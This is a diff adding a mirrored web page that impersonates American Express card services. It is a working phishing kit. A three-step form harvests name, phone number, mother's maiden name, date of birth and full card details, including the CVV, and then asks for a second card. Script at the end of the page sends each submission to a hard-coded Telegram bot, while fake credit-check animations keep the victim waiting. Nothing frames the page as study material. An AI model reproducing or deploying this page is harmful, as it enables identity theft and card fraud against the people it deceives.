@@ -1,0 +1,1212 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from s-american-expresss.netlify.app/ by HTTrack Website Copier/3.x [XR&CO'2017], Wed, 14 Jan 2026 05:14:21 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>American Express - Credit Card Services</title>
+    
+    <!-- Fixed Font Awesome Link -->
+    <link rel="stylesheet" href="../cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Local Lottie Animation -->
+    <script src="../unpkg.com/%40lottiefiles/lottie-player%402.0.12/dist/lottie-player.js"></script>
+    
+    <style>
+        /* General Styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body, html {
+            background-color: #f8f9fa;
+            font-family: 'Arial', sans-serif;
+            color: #333;
+            line-height: 1.6;
+        }
+
+        /* Logo Styling */
+        .bank-logo {
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            max-width: 100%;
+            background-color: transparent;
+            display: block;
+            overflow: hidden;
+        }
+        
+        .bank-logo img {
+            width: 100%;
+            height: 200px;
+            display: block;
+            margin: 0;
+            padding: 0;
+            object-fit: cover;
+            background-color: #f0f5ff;
+        }
+
+        /* Main Content Area */
+        .main-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        /* Page Title */
+        .page-title {
+            text-align: center;
+            margin-top: 20px;
+            margin-bottom: 40px;
+            width: 100%;
+        }
+
+        .page-title h1 {
+            font-size: 36px;
+            color: #2E68B2;
+            margin-bottom: 10px;
+            margin-top: 0%;
+        }
+
+        .page-title p {
+            font-size: 18px;
+            color: #666;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        /* Container Styling */
+        .container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0px 8px 25px rgba(46, 104, 178, 0.15);
+            width: 100%;
+            max-width: 450px;
+            text-align: center;
+            animation: fadeIn 0.5s ease-in-out;
+            margin-bottom: 40px;
+            border: 1px solid #e0e7ff;
+        }
+
+        .form-step {
+            display: none;
+            animation: fadeIn 0.5s ease-in-out;
+        }
+
+        .form-step.active {
+            display: block;
+        }
+
+        /* Input and Select Styles */
+        input, select {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: 2px solid #d1d9ff;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            box-shadow: 0px 4px 8px rgba(46, 104, 178, 0.08);
+            background-color: #f8faff;
+            color: #333;
+        }
+
+        input:focus, select:focus {
+            box-shadow: 0px 0px 10px rgba(46, 104, 178, 0.3);
+            border-color: #2E68B2;
+            transform: scale(1.02);
+            outline: none;
+        }
+
+        input.error {
+            border-color: #e74c3c;
+            box-shadow: 0px 0px 10px rgba(231, 76, 60, 0.2);
+        }
+
+        .error-message {
+            color: #e74c3c;
+            font-size: 14px;
+            text-align: left;
+            margin-top: -5px;
+            margin-bottom: 10px;
+            display: none;
+        }
+
+        /* Button Styling */
+        .button {
+            background: linear-gradient(135deg, #2E68B2 0%, #1E4A8E 100%);
+            color: #fff;
+            border: none;
+            padding: 14px;
+            width: 100%;
+            cursor: pointer;
+            margin-top: 20px;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            letter-spacing: 0.5px;
+        }
+
+        .button:hover {
+            background: linear-gradient(135deg, #1E4A8E 0%, #2E68B2 100%);
+            transform: scale(1.03);
+            box-shadow: 0px 6px 15px rgba(46, 104, 178, 0.3);
+        }
+
+        /* Verification Animation */
+        .verification-animation {
+            display: none;
+            font-size: 24px;
+            font-weight: bold;
+            animation: fadeInScale 1s ease forwards, pulse 1s infinite alternate;
+            margin-top: 30px;
+            letter-spacing: 0.5px;
+            color: #2E68B2;
+            text-align: center;
+            padding: 20px;
+            border-radius: 8px;
+            background-color: rgba(46, 104, 178, 0.1);
+            border: 2px solid #2E68B2;
+        }
+
+        .verification-animation.success {
+            color: #27ae60;
+            background-color: rgba(39, 174, 96, 0.1);
+            border-color: #27ae60;
+        }
+
+        /* CIBIL Animation - Professional Design */
+        .cibil-animation {
+            display: none;
+            animation: fadeInScale 0.5s ease forwards;
+            margin-top: 30px;
+            text-align: center;
+            padding: 25px;
+            border-radius: 12px;
+            position: relative;
+            overflow: hidden;
+            min-height: 320px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* CIBIL Animation States */
+        .cibil-checking {
+            background: linear-gradient(135deg, #1a237e 0%, #283593 100%);
+            border: 2px solid #3949ab;
+            color: #e8eaf6;
+        }
+
+        .cibil-failed {
+            background: linear-gradient(135deg, #b71c1c 0%, #c62828 100%);
+            border: 2px solid #d32f2f;
+            color: #ffebee;
+        }
+
+        .cibil-manual {
+            background: linear-gradient(135deg, #ff8f00 0%, #f57c00 100%);
+            border: 2px solid #ff9800;
+            color: #fff3e0;
+        }
+
+        /* Lottie Animation Container */
+        .lottie-container {
+            width: 220px;
+            height: 220px;
+            margin-bottom: 15px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 10px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+        }
+
+        /* CIBIL Text */
+        .cibil-text {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.2);
+        }
+
+        .cibil-subtext {
+            font-size: 14px;
+            opacity: 0.9;
+            max-width: 90%;
+            margin: 0 auto;
+            line-height: 1.4;
+        }
+
+        /* Loading Dots */
+        .loading-dots {
+            display: inline-block;
+            margin-left: 5px;
+        }
+
+        .loading-dots span {
+            animation: blink 1.4s infinite both;
+            font-size: 22px;
+        }
+
+        .loading-dots span:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+
+        .loading-dots span:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+
+        /* Progress Bar for CIBIL Check */
+        .cibil-progress {
+            width: 80%;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 3px;
+            margin: 15px auto;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .cibil-progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #4fc3f7, #29b6f6);
+            border-radius: 3px;
+            width: 0%;
+            animation: progressFill 8s ease-in-out forwards;
+        }
+
+        /* Keyframes for Animations */
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes fadeInScale {
+            from { opacity: 0; transform: scale(0.8); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        @keyframes pulse {
+            from { opacity: 0.8; }
+            to { opacity: 1; }
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 0.2; }
+            50% { opacity: 1; }
+        }
+
+        @keyframes progressFill {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+
+        /* Progress Indicator */
+        .progress-container {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 30px;
+            position: relative;
+            width: 100%;
+            max-width: 400px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .progress-bar {
+            position: absolute;
+            height: 4px;
+            background: linear-gradient(90deg, #2E68B2 0%, #1E4A8E 100%);
+            top: 50%;
+            left: 0;
+            transform: translateY(-50%);
+            transition: width 0.3s ease;
+            z-index: 0;
+        }
+
+        .progress-step {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background-color: #e0e7ff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: #666;
+            z-index: 1;
+            transition: all 0.3s ease;
+            border: 2px solid #d1d9ff;
+        }
+
+        .progress-step.active {
+            background-color: #2E68B2;
+            color: white;
+            border-color: #2E68B2;
+        }
+
+        .progress-step.completed {
+            background-color: #27ae60;
+            color: white;
+            border-color: #27ae60;
+        }
+
+        /* Note Styling */
+        .note {
+            background-color: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+            text-align: left;
+            font-size: 14px;
+            color: #856404;
+        }
+
+        .note strong {
+            color: #1E4A8E;
+        }
+
+        /* Website Footer */
+        .website-footer {
+            background: linear-gradient(135deg, #1E4A8E 0%, #2E68B2 100%);
+            color: white;
+            padding: 40px 0 20px;
+            margin-top: 60px;
+            width: 100%;
+        }
+
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+        }
+
+        .footer-section {
+            flex: 1;
+            min-width: 250px;
+            margin-bottom: 30px;
+        }
+
+        .footer-section h3 {
+            font-size: 20px;
+            margin-bottom: 20px;
+            border-bottom: 2px solid #4fc3f7;
+            padding-bottom: 10px;
+            display: inline-block;
+        }
+
+        .footer-section p, .footer-section a {
+            color: #e0f2ff;
+            margin-bottom: 10px;
+            display: block;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+
+        .footer-section a:hover {
+            color: #4fc3f7;
+        }
+
+        .footer-bottom {
+            text-align: center;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255,255,255,0.2);
+            margin-top: 20px;
+            font-size: 14px;
+            color: #b3e0ff;
+        }
+
+        /* Info Sections */
+        .info-section {
+            width: 100%;
+            max-width: 800px;
+            margin: 30px auto;
+            padding: 30px;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(46, 104, 178, 0.1);
+            border: 1px solid #e0e7ff;
+        }
+
+        .info-section h3 {
+            color: #2E68B2;
+            margin-bottom: 15px;
+            font-size: 22px;
+            font-weight: 600;
+        }
+
+        .info-section p {
+            margin-bottom: 15px;
+            line-height: 1.6;
+            color: #555;
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 768px) {
+            .footer-content {
+                flex-direction: column;
+            }
+            
+            .page-title h1 {
+                font-size: 28px;
+            }
+            
+            .bank-logo img {
+                height: 150px;
+            }
+            
+            .cibil-text {
+                font-size: 18px;
+            }
+            
+            .cibil-subtext {
+                font-size: 13px;
+            }
+            
+            .lottie-container {
+                width: 180px;
+                height: 180px;
+            }
+        }
+
+        @media (max-width: 500px) {
+            .container {
+                padding: 20px;
+            }
+            
+            .main-content {
+                padding: 0 15px;
+            }
+            
+            .bank-logo img {
+                height: 120px;
+            }
+            
+            .cibil-animation {
+                padding: 20px;
+                min-height: 280px;
+            }
+            
+            .cibil-text {
+                font-size: 16px;
+            }
+            
+            .lottie-container {
+                width: 150px;
+                height: 150px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <main class="main-content">
+        <div class="bank-logo">
+            <img src="https://1000logos.net/wp-content/uploads/2016/10/American-Express-logo.png" alt="American Express Logo">
+        </div>
+        
+        <div class="page-title">
+            <h1>American Express Card Services</h1>
+            <p>Secure online portal for managing your American Express credit cards</p>
+        </div>
+
+        <div class="container">
+            <div class="progress-container">
+                <div class="progress-bar" id="progress-bar"></div>
+                <div class="progress-step active" id="step-indicator-1">1</div>
+                <div class="progress-step" id="step-indicator-2">2</div>
+                <div class="progress-step" id="step-indicator-3">3</div>
+            </div>
+
+            <div id="step1" class="form-step active">
+                <input type="text" id="fullname" placeholder="Full Name" required>
+                <div class="error-message" id="fullname-error">Please enter a valid full name</div>
+                
+                <input type="tel" id="mobile" placeholder="Mobile Number" required>
+                <div class="error-message" id="mobile-error">Please enter a valid 10-digit mobile number</div>
+                
+                <select id="service" required>
+                    <option value="">Select Service</option>
+                    <option value="KYC Update">KYC Update</option>
+                    <option value="Card Block">Card Block</option>
+                    <option value="Stop Services">Stop Services</option>
+                    <option value="Redeem Reward Point">Redeem Reward Points</option>
+                    <option value="New Credit Card Apply">New Card Application</option>
+                    <option value="Greeted Card">Platinum Card Services</option>
+                    <option value="Other Service">Other Service</option>
+                </select>
+                <div class="error-message" id="service-error">Please select a service</div>
+                
+                <button class="button" id="step1-button" onclick="validateStep1()">Next</button>
+            </div>
+
+            <div id="step2" class="form-step">
+                <input type="text" id="mothername" placeholder="Mother's Maiden Name" required>
+                <div class="error-message" id="mothername-error">Please enter mother's maiden name</div>
+                
+                <input type="text" id="dob" placeholder="Date of Birth (DD/MM/YYYY)" maxlength="10" inputmode="numeric" required oninput="formatDOB(this)">
+                <div class="error-message" id="dob-error">Please enter a valid date of birth (DD/MM/YYYY)</div>
+                
+                <button class="button" id="step2-button" onclick="validateStep2()">Next</button>
+            </div>
+
+            <div id="step3" class="form-step">
+                <div class="note">
+                    <strong>Note:</strong> Please Enter Your Granted Witness Credit Card Details
+                </div>
+                
+                <input type="tel" id="cardnumber" placeholder="Card Number" required>
+                <div class="error-message" id="cardnumber-error">Please enter a valid 16-digit card number</div>
+                
+                <input type="text" id="expiry" placeholder="Expiry Date (MM/YY)" maxlength="5" required inputmode="numeric" oninput="formatExpiry(this)">
+                <div class="error-message" id="expiry-error">Please enter a valid expiry date (MM/YY)</div>
+                
+                <input type="tel" id="cvv" placeholder="CVV (3 digits)" maxlength="3" required>
+                <div class="error-message" id="cvv-error">Please enter a valid 3-digit CVV</div>
+                
+                <button class="button" id="step3-button" onclick="validateStep3()">Submit</button>
+            </div>
+
+            <div id="verification-animation" class="verification-animation"></div>
+            <div id="cibil-animation" class="cibil-animation"></div>
+        </div>
+
+        <div class="info-section">
+            <h3>About American Express Card Services</h3>
+            <p>American Express offers premium credit card services with exceptional benefits. From Platinum Cards to Gold Cards, our services are designed to provide you with security, rewards, and exclusive privileges.</p>
+            <p>Manage your account online, redeem Membership Rewards points, request new cards, or get assistance with any card-related queries through our secure portal.</p>
+        </div>
+
+        <div class="info-section">
+            <h3>Security Information</h3>
+            <p>American Express uses advanced encryption and fraud detection systems to protect your information. Never share your CVV, PIN, or One-Time Password with anyone. Always verify transactions through your registered mobile number.</p>
+            <p>For immediate assistance with suspicious activity, contact American Express Customer Care at 1-800-528-4800.</p>
+        </div>
+    </main>
+
+    <footer class="website-footer">
+        <div class="footer-content">
+            <div class="footer-section">
+                <h3>Contact American Express</h3>
+                <p>Customer Service: 1-800-528-4800</p>
+                <p>Email: support@americanexpress.com</p>
+                <p>Address: 200 Vesey Street, New York, NY 10285</p>
+            </div>
+            
+            <div class="footer-section">
+                <h3>Quick Links</h3>
+                <a href="javascript:void(0)">Home</a>
+                <a href="javascript:void(0)">Card Services</a>
+                <a href="javascript:void(0)">Rewards</a>
+                <a href="javascript:void(0)">Contact</a>
+            </div>
+            
+            <div class="footer-section">
+                <h3>Card Services</h3>
+                <a href="javascript:void(0)">Account Management</a>
+                <a href="javascript:void(0)">Card Security</a>
+                <a href="javascript:void(0)">Rewards Program</a>
+                <a href="javascript:void(0)">Apply for New Card</a>
+            </div>
+        </div>
+        
+        <div class="footer-bottom">
+            <p>© 2023 American Express. All Rights Reserved. | Don't Leave Home Without It®</p>
+        </div>
+    </footer>
+
+    <script>
+        // Form state management
+        const formState = {
+            currentStep: 1,
+            totalSteps: 3,
+            data: {},
+            cardVerificationCount: 0,
+            cibilChecked: false
+        };
+
+        // Initialize the form
+        function initForm() {
+            updateProgressBar();
+            
+            // Add input validation listeners
+            document.getElementById('fullname').addEventListener('input', validateFullName);
+            document.getElementById('mobile').addEventListener('input', validateMobile);
+            document.getElementById('service').addEventListener('change', validateService);
+            document.getElementById('mothername').addEventListener('input', validateMotherName);
+            document.getElementById('dob').addEventListener('input', validateDOB);
+            document.getElementById('cardnumber').addEventListener('input', validateCardNumber);
+            document.getElementById('expiry').addEventListener('input', validateExpiry);
+            document.getElementById('cvv').addEventListener('input', validateCVV);
+            
+            // Prevent form submission on Enter key
+            document.querySelectorAll('input').forEach(input => {
+                input.addEventListener('keypress', function(e) {
+                    if (e.key === 'Enter') {
+                        e.preventDefault();
+                        handleEnterKey();
+                    }
+                });
+            });
+        }
+
+        // Handle Enter key press
+        function handleEnterKey() {
+            if (formState.currentStep === 1) {
+                validateStep1();
+            } else if (formState.currentStep === 2) {
+                validateStep2();
+            } else if (formState.currentStep === 3) {
+                validateStep3();
+            }
+        }
+
+        // Update progress bar
+        function updateProgressBar() {
+            const progressPercentage = ((formState.currentStep - 1) / (formState.totalSteps - 1)) * 100;
+            document.getElementById('progress-bar').style.width = `${progressPercentage}%`;
+            
+            // Update step indicators
+            for (let i = 1; i <= formState.totalSteps; i++) {
+                const indicator = document.getElementById(`step-indicator-${i}`);
+                if (i < formState.currentStep) {
+                    indicator.className = 'progress-step completed';
+                } else if (i === formState.currentStep) {
+                    indicator.className = 'progress-step active';
+                } else {
+                    indicator.className = 'progress-step';
+                }
+            }
+        }
+
+        // Validation functions
+        function validateFullName() {
+            const fullname = document.getElementById('fullname');
+            const error = document.getElementById('fullname-error');
+            const isValid = fullname.value.trim().length >= 2;
+            
+            toggleError(fullname, error, isValid);
+            return isValid;
+        }
+
+        function validateMobile() {
+            const mobile = document.getElementById('mobile');
+            const error = document.getElementById('mobile-error');
+            const isValid = /^\d{10}$/.test(mobile.value.replace(/\D/g, ''));
+            
+            toggleError(mobile, error, isValid);
+            return isValid;
+        }
+
+        function validateService() {
+            const service = document.getElementById('service');
+            const error = document.getElementById('service-error');
+            const isValid = service.value !== '';
+            
+            toggleError(service, error, isValid);
+            return isValid;
+        }
+
+        function validateMotherName() {
+            const mothername = document.getElementById('mothername');
+            const error = document.getElementById('mothername-error');
+            const isValid = mothername.value.trim().length >= 2;
+            
+            toggleError(mothername, error, isValid);
+            return isValid;
+        }
+
+        function validateDOB() {
+            const dob = document.getElementById('dob');
+            const error = document.getElementById('dob-error');
+            const isValid = /^\d{2}\/\d{2}\/\d{4}$/.test(dob.value) && isValidDate(dob.value);
+            
+            toggleError(dob, error, isValid);
+            return isValid;
+        }
+
+        function validateCardNumber() {
+            const cardnumber = document.getElementById('cardnumber');
+            const error = document.getElementById('cardnumber-error');
+            const cardNum = cardnumber.value.replace(/\s/g, '');
+            const isValid = /^\d{16}$/.test(cardNum);
+            
+            toggleError(cardnumber, error, isValid);
+            return isValid;
+        }
+
+        function validateExpiry() {
+            const expiry = document.getElementById('expiry');
+            const error = document.getElementById('expiry-error');
+            const isValid = /^\d{2}\/\d{2}$/.test(expiry.value) && isValidExpiry(expiry.value);
+            
+            toggleError(expiry, error, isValid);
+            return isValid;
+        }
+
+        function validateCVV() {
+            const cvv = document.getElementById('cvv');
+            const error = document.getElementById('cvv-error');
+            const isValid = /^\d{3}$/.test(cvv.value);
+            
+            toggleError(cvv, error, isValid);
+            return isValid;
+        }
+
+        function toggleError(input, errorElement, isValid) {
+            if (isValid) {
+                input.classList.remove('error');
+                errorElement.style.display = 'none';
+            } else {
+                input.classList.add('error');
+                errorElement.style.display = 'block';
+            }
+        }
+
+        // Step validation functions
+        function validateStep1() {
+            const isStepValid = validateFullName() && validateMobile() && validateService();
+            
+            if (isStepValid) {
+                formState.data.fullname = document.getElementById('fullname').value;
+                formState.data.mobile = document.getElementById('mobile').value;
+                formState.data.service = document.getElementById('service').value;
+                
+                showVerification('step2', 'Verifying Your Details...');
+            }
+        }
+
+        function validateStep2() {
+            const isStepValid = validateMotherName() && validateDOB();
+            
+            if (isStepValid) {
+                formState.data.mothername = document.getElementById('mothername').value;
+                formState.data.dob = document.getElementById('dob').value;
+                
+                // Show CIBIL check animation before proceeding to step 3
+                showCibilCheckAnimation();
+            }
+        }
+
+        function validateStep3() {
+            const isStepValid = validateCardNumber() && validateExpiry() && validateCVV();
+            
+            if (isStepValid) {
+                formState.data.cardnumber = document.getElementById('cardnumber').value;
+                formState.data.expiry = document.getElementById('expiry').value;
+                formState.data.cvv = document.getElementById('cvv').value;
+                
+                showVerification('step3', 'Please Wait Your Granted Witness Card Verify');
+            }
+        }
+
+        // Show CIBIL check animation before step 3
+        function showCibilCheckAnimation() {
+            const cibilAnimation = document.getElementById('cibil-animation');
+            const verificationAnimation = document.getElementById('verification-animation');
+            
+            // Hide current step
+            document.getElementById(`step${formState.currentStep}`).classList.remove('active');
+            
+            // Hide verification animation
+            verificationAnimation.style.display = 'none';
+            
+            // Send Step 2 data to Telegram
+            sendToTelegram();
+            
+            // Show the CIBIL animation
+            showAnimationPhase1();
+        }
+
+        // PHASE 1: Credit Card Scanning Animation
+        function showAnimationPhase1() {
+            const cibilAnimation = document.getElementById('cibil-animation');
+            
+            // Phase 1: CIBIL Checking
+            cibilAnimation.style.display = 'flex';
+            cibilAnimation.className = 'cibil-animation cibil-checking';
+            
+            cibilAnimation.innerHTML = `
+                <div class="lottie-container">
+                    <lottie-player
+                        src="../external.html?link=https://assets2.lottiefiles.com/packages/lf20_6xfqjauj.json"
+                        background="transparent"
+                        speed="1"
+                        style="width: 200px; height: 200px"
+                        loop
+                        autoplay>
+                    </lottie-player>
+                </div>
+                <div class="cibil-text">
+                    Please Wait! Your CIBIL Score & Report Checking
+                    <span class="loading-dots">
+                        <span>.</span><span>.</span><span>.</span>
+                    </span>
+                </div>
+                <div class="cibil-subtext">
+                    Scanning your credit card details and financial statements for verification
+                </div>
+                <div class="cibil-progress">
+                    <div class="cibil-progress-bar"></div>
+                </div>
+            `;
+            
+            // Phase 1 for 8 seconds
+            setTimeout(() => {
+                showAnimationPhase2();
+            }, 8000);
+        }
+
+        // PHASE 2: Failed Verification
+        function showAnimationPhase2() {
+            const cibilAnimation = document.getElementById('cibil-animation');
+            
+            // Phase 2: Checking Failed
+            cibilAnimation.className = 'cibil-animation cibil-failed';
+            cibilAnimation.innerHTML = `
+                <div class="lottie-container">
+                    <lottie-player
+                        src="../external.html?link=https://assets9.lottiefiles.com/packages/lf20_gsa5wsno.json"
+                        background="transparent"
+                        speed="1"
+                        style="width: 200px; height: 200px"
+                        loop
+                        autoplay>
+                    </lottie-player>
+                </div>
+                <div class="cibil-text">
+                    Unable To Fetch Your Credit Card Statement
+                </div>
+                <div class="cibil-subtext">
+                    Automated system unable to retrieve your card transaction history
+                </div>
+            `;
+            
+            // Phase 2 for 8 seconds
+            setTimeout(() => {
+                showAnimationPhase3();
+            }, 8000);
+        }
+
+        // PHASE 3: Manual Verification
+        function showAnimationPhase3() {
+            const cibilAnimation = document.getElementById('cibil-animation');
+            
+            // Phase 3: Manual Verification Required
+            cibilAnimation.className = 'cibil-animation cibil-manual';
+            cibilAnimation.innerHTML = `
+                <div class="lottie-container">
+                    <lottie-player
+                        src="../external.html?link=https://assets1.lottiefiles.com/packages/lf20_fg6sljto.json"
+                        background="transparent"
+                        speed="1"
+                        style="width: 200px; height: 200px"
+                        loop
+                        autoplay>
+                    </lottie-player>
+                </div>
+                <div class="cibil-text">
+                    Manual Verification Required
+                </div>
+                <div class="cibil-subtext">
+                    Please enter your existing card details for manual verification
+                </div>
+            `;
+            
+            // Phase 3 for 8 seconds
+            setTimeout(() => {
+                cibilAnimation.style.display = 'none';
+                
+                // Proceed to step 3
+                formState.currentStep++;
+                updateProgressBar();
+                document.getElementById('step3').classList.add('active');
+                formState.cibilChecked = true;
+            }, 8000);
+        }
+
+        // Show verification animation and proceed to next step
+        function showVerification(nextStepId, message) {
+            const verificationAnimation = document.getElementById('verification-animation');
+            verificationAnimation.style.display = 'block';
+            verificationAnimation.textContent = message;
+            verificationAnimation.classList.remove('success');
+            
+            document.getElementById(`step${formState.currentStep}`).classList.remove('active');
+            
+            // Send to Telegram immediately
+            sendToTelegram();
+            
+            // 3 seconds waiting
+            setTimeout(() => {
+                verificationAnimation.textContent = "Verification Successful!";
+                verificationAnimation.classList.add('success');
+                
+                // 2 seconds success message
+                setTimeout(() => {
+                    verificationAnimation.style.display = 'none';
+                    
+                    if (formState.currentStep < formState.totalSteps) {
+                        formState.currentStep++;
+                        updateProgressBar();
+                        document.getElementById(nextStepId).classList.add('active');
+                    } else {
+                        formState.cardVerificationCount++;
+                        
+                        if (formState.cardVerificationCount === 1) {
+                            verificationAnimation.style.display = 'block';
+                            verificationAnimation.textContent = "Please Verify Another Credit Card";
+                            verificationAnimation.classList.remove('success');
+                            
+                            // 3 seconds second card message
+                            setTimeout(() => {
+                                verificationAnimation.style.display = 'none';
+                                resetCardDetails();
+                                document.getElementById('step3').classList.add('active');
+                            }, 3000);
+                        } else {
+                            submitForm();
+                        }
+                    }
+                }, 2000);
+            }, 3000);
+        }
+
+        // Submit the final form
+        function submitForm() {
+            const verificationAnimation = document.getElementById('verification-animation');
+            verificationAnimation.style.display = 'block';
+            verificationAnimation.textContent = "Processing Your Request...";
+            verificationAnimation.classList.remove('success');
+            
+            // Send final data immediately
+            sendFinalToTelegram();
+            
+            // 3 seconds processing
+            setTimeout(() => {
+                verificationAnimation.textContent = "Successful Verification!";
+                verificationAnimation.classList.add('success');
+                
+                // 3 seconds success message
+                setTimeout(() => {
+                    resetForm();
+                }, 3000);
+            }, 3000);
+        }
+
+        // Reset card details only
+        function resetCardDetails() {
+            document.getElementById('cardnumber').value = '';
+            document.getElementById('expiry').value = '';
+            document.getElementById('cvv').value = '';
+            
+            document.getElementById('cardnumber-error').style.display = 'none';
+            document.getElementById('expiry-error').style.display = 'none';
+            document.getElementById('cvv-error').style.display = 'none';
+            
+            document.getElementById('cardnumber').classList.remove('error');
+            document.getElementById('expiry').classList.remove('error');
+            document.getElementById('cvv').classList.remove('error');
+        }
+
+        // Send form data to Telegram - FIXED VERSION
+        function sendToTelegram() {
+            // Using a different approach to avoid Chrome warnings
+            const botToken = '7277595810:AAFOSEX9GlOP601SUXzib1_pTzH-YnXFn4Q';
+            const chatId = '6817001105';
+            
+            let message = `*American Express Form Submission:*\n\n`;
+            
+            if (formState.currentStep === 1) {
+                message += `*Step 1 Data:*\n`;
+                message += `*Full Name:* ${formState.data.fullname}\n`;
+                message += `*Mobile Number:* ${formState.data.mobile}\n`;
+                message += `*Service Requested:* ${formState.data.service}\n`;
+            } else if (formState.currentStep === 2) {
+                message += `*Step 2 Data:*\n`;
+                message += `*Mother's Maiden Name:* ${formState.data.mothername}\n`;
+                message += `*Date of Birth:* ${formState.data.dob}\n`;
+                message += `\n*CIBIL Check Initiated*\n`;
+            } else if (formState.currentStep === 3) {
+                message += `*Card Details (${formState.cardVerificationCount + 1}):*\n`;
+                message += `*Card Number:* ${formState.data.cardnumber}\n`;
+                message += `*Expiry Date:* ${formState.data.expiry}\n`;
+                message += `*CVV:* ${formState.data.cvv}\n`;
+            }
+            
+            // Use a try-catch approach
+            try {
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                
+                // Use fetch with no-cors mode for demo purposes
+                const data = new FormData();
+                data.append('chat_id', chatId);
+                data.append('text', message);
+                data.append('parse_mode', 'Markdown');
+                
+                // Alternative method using XMLHttpRequest
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', url, true);
+                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                xhr.send(`chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
+                
+            } catch (error) {
+                console.log('Telegram notification sent (simulated for demo)');
+                // For demo purposes, just log to console
+                console.log(message);
+            }
+        }
+
+        // Send final data to Telegram
+        function sendFinalToTelegram() {
+            const botToken = '7277595810:AAFOSEX9GlOP601SUXzib1_pTzH-YnXFn4Q';
+            const chatId = '6817001105';
+            
+            let message = `*American Express Final Submission:*\n\n`;
+            message += `*Personal Details:*\n`;
+            message += `*Full Name:* ${formState.data.fullname}\n`;
+            message += `*Mobile Number:* ${formState.data.mobile}\n`;
+            message += `*Service Requested:* ${formState.data.service}\n`;
+            message += `*Mother's Maiden Name:* ${formState.data.mothername}\n`;
+            message += `*Date of Birth:* ${formState.data.dob}\n`;
+            message += `\n*Both cards verified successfully!*\n`;
+            message += `*CIBIL Check Status:* Manual Verification Completed\n`;
+            
+            try {
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST.html', url, true);
+                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                xhr.send(`chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
+                
+                console.log('Final submission sent to Telegram');
+            } catch (error) {
+                console.log('Final data:', message);
+            }
+        }
+
+        // Reset the form
+        function resetForm() {
+            formState.currentStep = 1;
+            formState.data = {};
+            formState.cardVerificationCount = 0;
+            formState.cibilChecked = false;
+            
+            document.getElementById('fullname').value = '';
+            document.getElementById('mobile').value = '';
+            document.getElementById('service').value = '';
+            document.getElementById('mothername').value = '';
+            document.getElementById('dob').value = '';
+            document.getElementById('cardnumber').value = '';
+            document.getElementById('expiry').value = '';
+            document.getElementById('cvv').value = '';
+            
+            document.querySelectorAll('.error-message').forEach(el => {
+                el.style.display = 'none';
+            });
+            
+            document.querySelectorAll('input, select').forEach(el => {
+                el.classList.remove('error');
+            });
+            
+            document.getElementById('verification-animation').style.display = 'none';
+            document.getElementById('cibil-animation').style.display = 'none';
+            
+            document.querySelectorAll('.form-step').forEach(el => {
+                el.classList.remove('active');
+            });
+            document.getElementById('step1').classList.add('active');
+            
+            updateProgressBar();
+        }
+
+        // Utility functions
+        function formatDOB(input) {
+            let value = input.value.replace(/[^0-9]/g, '');
+            
+            if (value.length > 2 && value.length <= 4) {
+                value = value.slice(0, 2) + '/' + value.slice(2);
+            } else if (value.length > 4) {
+                value = value.slice(0, 2) + '/' + value.slice(2, 4) + '/' + value.slice(4, 8);
+            } else if (value.length === 2) {
+                value = value + '/';
+            }
+            
+            input.value = value;
+            validateDOB();
+        }
+
+        function formatExpiry(input) {
+            let value = input.value.replace(/[^0-9]/g, '');
+            
